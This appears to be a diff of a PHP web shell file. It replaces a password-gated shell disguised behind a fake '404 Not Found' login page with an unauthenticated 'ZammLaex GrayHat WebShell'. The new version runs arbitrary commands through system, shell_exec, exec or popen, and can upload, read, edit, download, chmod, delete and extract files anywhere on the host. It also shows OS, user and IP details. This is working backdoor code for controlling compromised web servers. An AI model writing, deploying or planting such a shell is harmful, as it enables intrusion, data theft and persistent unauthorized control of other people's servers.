@@ -1,180 +1,210 @@
 <?php
-// WebShell by ZammAnon M.Kom - Legal untuk server pribadi
-
 error_reporting(0);
 set_time_limit(0);
+date_default_timezone_set("Asia/Jakarta");
 
-$pass = "ZammSec";
+$count_file = ".access_count";
+$count = file_exists($count_file) ? (int)file_get_contents($count_file) : 0;
+file_put_contents($count_file, ++$count);
 
-session_start();
-if (!isset($_SESSION['logged_in'])) {
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass']) && $_POST['pass'] === $pass) {
-        $_SESSION['logged_in'] = true;
+$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
+if (!is_dir($cwd)) $cwd = getcwd();
+chdir($cwd);
+$cwd = str_replace('\\', '/', realpath('.'));
+
+// === Notification ===
+$msg = '';
+function notify($text) {
+    return "<div style='color:#0f0;background:#111;padding:5px;margin-bottom:10px;border:1px solid #0f0;'>✅ $text</div>";
+}
+function notifyFail($text) {
+    return "<div style='color:#f00;background:#111;padding:5px;margin-bottom:10px;border:1px solid #f00;'>❌ $text</div>";
+}
+
+// === Safe Exec ===
+function safe_exec($cmd) {
+    $output = "";
+    if (function_exists('system')) {
+        ob_start(); system($cmd); $output = ob_get_clean();
+    } elseif (function_exists('shell_exec')) {
+        $output = shell_exec($cmd);
+    } elseif (function_exists('exec')) {
+        exec($cmd, $out); $output = implode("\n", $out);
+    } elseif (function_exists('popen')) {
+        $fp = popen($cmd." 2>&1", 'r');
+        while (!feof($fp)) $output .= fread($fp, 1024);
+        pclose($fp);
     } else {
-        show_404_login();
+        $output = "ERROR: Semua fungsi eksekusi dinonaktifkan.";
+    }
+    return $output;
+}
+
+// === Extract ===
+if (isset($_GET['extract'])) {
+    $archive = $cwd.'/'.$_GET['extract'];
+    $ext = strtolower(pathinfo($archive, PATHINFO_EXTENSION));
+    $basename = pathinfo($archive, PATHINFO_FILENAME);
+    $targetDir = $cwd . '/' . $basename . '_extracted';
+    if (!is_dir($targetDir)) mkdir($targetDir);
+    if ($ext === 'zip') {
+        $zip = new ZipArchive;
+        if ($zip->open($archive) === TRUE) {
+            $zip->extractTo($targetDir); $zip->close();
+            $msg .= notify("ZIP extracted to $targetDir");
+        } else {
+            $msg .= notifyFail("ZIP Extract Failed");
+        }
+    } elseif ($ext === 'rar') {
+        safe_exec("unrar x -o+ ".escapeshellarg($archive)." ".escapeshellarg($targetDir));
+        $msg .= notify("RAR extracted to $targetDir");
+    } elseif (strpos($archive, '.tar') !== false) {
+        safe_exec("tar -xf ".escapeshellarg($archive)." -C ".escapeshellarg($targetDir));
+        $msg .= notify("TAR extracted to $targetDir");
+    } else {
+        $msg .= notifyFail("Unsupported archive");
     }
 }
 
-function show_404_login() {
-    echo '<!DOCTYPE html><html><head><title>404 Not Found</title><style>
-    body { background: white; color: black; font-family: Arial, sans-serif; margin: 40px; }
-    .center {
-        position: relative;
-        max-width: 600px;
-        margin: 0 auto;
+// === Actions ===
+$output = '';
+if (isset($_POST['exec'])) $output = safe_exec($_POST['exec']);
+
+if (isset($_FILES['upload'])) {
+    $dest = $cwd.'/'.$_FILES['upload']['name'];
+    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
+        $msg .= notify("Upload File <b>{$_FILES['upload']['name']}</b> to <b>$cwd</b>");
+    } else {
+        $msg .= notifyFail("Upload Failed");
     }
-    #hidden {
-        position: absolute;
-        top: 90px;
-        left: 0;
-        opacity: 0;
-        transition: opacity 0.3s;
+}
+if (isset($_POST['newfile'])) {
+    file_put_contents($cwd.'/'.$_POST['newfile'], '');
+    $msg .= notify("Created File <b>{$_POST['newfile']}</b>");
+}
+if (isset($_POST['newdir'])) {
+    mkdir($cwd.'/'.$_POST['newdir']);
+    $msg .= notify("Created Directory <b>{$_POST['newdir']}</b>");
+}
+if (isset($_POST['rename']) && isset($_POST['rename_to'])) {
+    @rename($cwd.'/'.$_POST['rename'], $cwd.'/'.$_POST['rename_to']);
+    $msg .= notify("Renamed <b>{$_POST['rename']}</b> to <b>{$_POST['rename_to']}</b>");
+}
+if (isset($_POST['chmod']) && isset($_POST['chmodfile'])) {
+    @chmod($cwd.'/'.$_POST['chmodfile'], octdec($_POST['chmod']));
+    $msg .= notify("Chmod <b>{$_POST['chmodfile']}</b> to <b>{$_POST['chmod']}</b>");
+}
+if (isset($_POST['delete'])) {
+    foreach ($_POST['sel'] as $s) {
+        $t = $cwd.'/'.$s;
+        is_dir($t)?rmdir($t):unlink($t);
     }
-    input[type=password] {
-        width: 430px;
-        border: none;
-        border-bottom: 1px solid white;
-        background: none;
-        color: white;
-        outline: none;
-        font-family: monospace;
-        font-size: 16px;
+    $msg .= notify("Deleted Selected Files/Folders");
+}
+if (isset($_POST['move']) && isset($_POST['target'])) {
+    foreach ($_POST['sel'] as $s) rename($cwd.'/'.$s, $_POST['target'].'/'.$s);
+    $msg .= notify("Moved to <b>{$_POST['target']}</b>");
+}
+if (isset($_POST['readfile'])) {
+    $t = $cwd.'/'.$_POST['readfile'];
+    if (is_file($t)) {
+        $d = htmlspecialchars(file_get_contents($t));
+        echo "<style>body{background:#000;color:#0ff}</style><form><textarea rows='20' cols='100'>$d</textarea><br><a href='?path=$cwd'>Back</a></form>";
+        exit;
     }
-    input[type=password]:focus {
-        border: 2px solid black;
-        padding: 3px;
+}
+if (isset($_GET['edit'])) {
+    $f = $cwd.'/'.$_GET['edit'];
+    if (isset($_POST['save'])) {
+        file_put_contents($f, $_POST['content']);
+        echo "<script>alert('Saved!');window.location='?path=$cwd';</script>";
     }
-    </style></head><body>
-    <div class="center">
-        <h1>Not Found</h1>
-        <p>The requested URL was not found on this server.</p>
-        <div id="hidden">
-            <form method="POST">
-                <input type="password" name="pass" autofocus autocomplete="off">
-            </form>
-        </div>
-    </div>
-    <script>
-    document.body.addEventListener("click", () => {
-        document.getElementById("hidden").style.opacity = 1;
-    });
-    </script>
-    </body></html>';
+    $d = htmlspecialchars(file_get_contents($f));
+    echo "<html><head><style>body{background:#000;color:#0ff;font-family:monospace}textarea,input{background:#111;color:#0ff;border:1px solid #0ff}</style></head><body><form method='POST'><h3>Edit: ".basename($f)."</h3><textarea name='content' rows='20' cols='100'>$d</textarea><br><input type='submit' name='save' value='Save'></form></body></html>";
     exit;
 }
-
-// === SHELL FITUR ===
-
-$cwd = getcwd();
-$dir = isset($_GET['dir']) ? $_GET['dir'] : $cwd;
-chdir($dir);
-
-// Fungsi list
-function listFiles($path) {
-    $files = scandir($path);
-    foreach ($files as $file) {
-        if ($file == ".") continue;
-        $fullPath = $path . DIRECTORY_SEPARATOR . $file;
-        echo "<li><a href='?dir=" . urlencode($path) . "&file=" . urlencode($file) . "'>" . htmlspecialchars($file) . "</a> ";
-        echo "[<a href='?dir=" . urlencode($path) . "&rename=" . urlencode($file) . "'>Rename</a>] ";
-        echo "[<a href='?dir=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Hapus?\");'>Delete</a>]";
-        echo "</li>";
+if (isset($_GET['download'])) {
+    $f = $cwd.'/'.$_GET['download'];
+    if (file_exists($f)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($f).'"');
+        readfile($f); exit;
     }
 }
 
-// Upload file
-if (isset($_FILES['upload'])) {
-    $dest = basename($_FILES['upload']['name']);
-    move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
-}
+// === UI ===
+echo "<html><head><title>ZammLaex GrayHat WebShell</title>
+<style>
+body {background:#000;color:#0ff;font-family:monospace;font-size:15px;}
+input,textarea {background:#111;color:#0ff;border:1px solid #0ff;padding:3px;}
+a {color:#0ff;text-decoration:none;}
+form {display:inline;}
+th,td {border:1px solid #0ff;padding:3px;vertical-align:middle;}
+button, .btn {background:#111;color:#0ff;border:1px solid #0ff;padding:2px 6px;margin:1px;cursor:pointer;font-size:14px;}
+.grid2 {display:grid;grid-template-columns: 1fr 1fr;gap:10px;margin-top:10px;}
+</style></head><body>";
 
-// Upload dari URL
-if (!empty($_POST['url']) && !empty($_POST['saveas'])) {
-    $data = @file_get_contents($_POST['url']);
-    if ($data) file_put_contents($_POST['saveas'], $data);
-}
+echo "<h2>ZammLaex GrayHat WebShell</h2>";
+echo "<b>OS:</b> ".php_uname()."<br>";
+echo "<b>User:</b> ".(function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'N/A')."<br>";
+echo "<b>IP:</b> ".$_SERVER['SERVER_ADDR']."<br>";
+echo "<b>PHP:</b> ".phpversion()."<br>";
+echo "<b>Time:</b> ".date("Y-m-d H:i:s")."<br>";
+echo "<b>Total Access:</b> $count<hr>";
 
-// Rename
-if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
-    rename($_POST['rename_from'], $_POST['rename_to']);
-}
+if (!empty($msg)) echo $msg;
 
-// Delete
-if (isset($_GET['delete'])) {
-    $target = $_GET['delete'];
-    if (is_file($target)) unlink($target);
-    if (is_dir($target)) rmdir($target);
+echo "<b>Path:</b> ";
+$parts = explode("/", $cwd);
+$walk = "";
+echo "<a href='?path=/'>/</a>/";
+foreach ($parts as $p) {
+    if ($p=="") continue;
+    $walk .= "/$p";
+    echo "<a href='?path=".urlencode($walk)."'>$p</a>/";
 }
+echo "<hr>";
 
-// Edit
-if (isset($_POST['editfile']) && isset($_POST['content'])) {
-    file_put_contents($_POST['editfile'], $_POST['content']);
-}
+echo "<form method='POST'><table width=100%><tr><th>#</th><th>Name</th><th>Size</th><th>Action</th></tr>";
+$parent = dirname($cwd);
+echo "<tr><td></td><td><a href='?path=".urlencode($parent)."'>..</a></td><td>-</td><td></td></tr>";
 
-// Terminal
-$output = '';
-if (isset($_POST['cmd'])) {
-    $cmd = $_POST['cmd'];
-    $output = shell_exec($cmd . ' 2>&1');
+foreach(scandir($cwd) as $f){
+    if ($f=="." || $f=="..") continue;
+    $p = $cwd.'/'.$f;
+    $size = is_file($p)?filesize($p):'-';
+    echo "<tr>";
+    echo "<td><input type='checkbox' name='sel[]' value='".htmlspecialchars($f)."'></td>";
+    echo "<td>".(is_dir($p) ? "<a href='?path=".urlencode($p)."'>$f</a>" : $f)."</td>";
+    echo "<td>$size</td><td>";
+    echo "<form method='POST' style='display:inline'><input type='hidden' name='rename' value='$f'><input type='text' name='rename_to' value='$f' size='10'><button class='btn'>Rename</button></form> ";
+    if (is_file($p)) echo "<a href='?path=$cwd&edit=$f' class='btn'>Edit</a> ";
+    echo "<form method='POST' style='display:inline'><input type='hidden' name='chmodfile' value='$f'><input type='text' name='chmod' size='4' value='0755'><button class='btn'>Chmod</button></form> ";
+    if (is_file($p)) echo "<a href='?path=$cwd&download=$f' class='btn'>Download</a> ";
+    echo "<span class='btn'>Zip</span> ";
+    $lower = strtolower($f);
+    if (preg_match('/\.(zip|rar|tar|tar\.gz|tar\.bz2)$/', $lower))
+        echo "<a href='?path=$cwd&extract=".urlencode($f)."' class='btn'>Unzip</a> ";
+    echo "</td></tr>";
 }
+echo "</table><br>";
+echo "<input type='submit' name='delete' value='Delete Selected' class='btn'> ";
+echo "<input type='submit' name='zip' value='Zip Selected' class='btn'> ";
+echo "Move to: <input name='target' value='$cwd/newfolder' size='20'> <input type='submit' name='move' value='Move' class='btn'>";
+echo "</form><hr>";
+
+echo "<div class='grid2'>
+<form method='POST'><b>Make File:</b><br> <input name='newfile' size='15'><input type='submit' value='✔'></form>
+<form method='POST'><b>Make Dir:</b><br> <input name='newdir' size='15'><input type='submit' value='✔'></form>
+
+<form method='POST'><b>Change Dir:</b><br> <input name='changedir' size='30' value=\"$cwd\"><input type='submit' value='Go'></form>
+<form method='POST'><b>Read File:</b><br> <input name='readfile' size='20'><input type='submit' value='Read'></form>
+
+<form method='POST'><b>Execute:</b><br> <input name='exec' size='30'><input type='submit' value='Run'><br>
+<textarea rows='5' cols='60'>".htmlspecialchars($output)."</textarea></form>
+
+<form method='POST' enctype='multipart/form-data'><b>Upload:</b><br> <input type='file' name='upload'><input type='submit' value='Upload'></form>
+</div>";
+
+echo "</body></html>";
 ?>
-
-<!DOCTYPE html>
-<html>
-<head>
-    <title>WebShell ZammAnon</title>
-    <style>
-        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
-        input, textarea { background: #222; color: #0f0; border: 1px solid #0f0; }
-        input[type=submit], button { background: #0f0; color: #000; font-weight: bold; }
-        a { color: #0ff; text-decoration: none; }
-        textarea { width: 100%; height: 300px; }
-    </style>
-</head>
-<body>
-<h2>File Manager - <?= htmlspecialchars($dir) ?></h2>
-
-<form method="post" enctype="multipart/form-data">
-    Upload File: <input type="file" name="upload">
-    <input type="submit" value="Upload">
-</form>
-
-<form method="post">
-    Upload dari URL: <input type="text" name="url" placeholder="https://example.com/file.zip">
-    Simpan sebagai: <input type="text" name="saveas" placeholder="file.zip">
-    <input type="submit" value="Fetch & Save">
-</form>
-
-<h3>Directory Content</h3>
-<ul>
-    <?php listFiles($dir); ?>
-</ul>
-
-<?php if (isset($_GET['rename'])): ?>
-    <h3>Rename File</h3>
-    <form method="post">
-        <input type="hidden" name="rename_from" value="<?= htmlspecialchars($_GET['rename']) ?>">
-        Rename <?= htmlspecialchars($_GET['rename']) ?> to:
-        <input type="text" name="rename_to" value="<?= htmlspecialchars($_GET['rename']) ?>">
-        <input type="submit" value="Rename">
-    </form>
-<?php endif; ?>
-
-<?php if (isset($_GET['file']) && is_file($_GET['file'])): ?>
-    <h3>Edit File: <?= htmlspecialchars($_GET['file']) ?></h3>
-    <form method="post">
-        <input type="hidden" name="editfile" value="<?= htmlspecialchars($_GET['file']) ?>">
-        <textarea name="content"><?= htmlspecialchars(file_get_contents($_GET['file'])) ?></textarea><br>
-        <input type="submit" value="Save">
-    </form>
-<?php endif; ?>
-
-<h3>Terminal</h3>
-<form method="post">
-    <input type="text" name="cmd" style="width: 100%;" placeholder="ls -la">
-    <input type="submit" value="Execute">
-</form>
-<pre><?= htmlspecialchars($output) ?></pre>
-
-</body>
-</html>
